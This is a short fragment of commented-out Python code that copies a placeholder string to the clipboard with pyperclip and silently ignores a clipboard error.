#            pyperclip.copy("WORKSEHHEHE")
#     except pyperclip.PyperclipException:
#        pass  
  
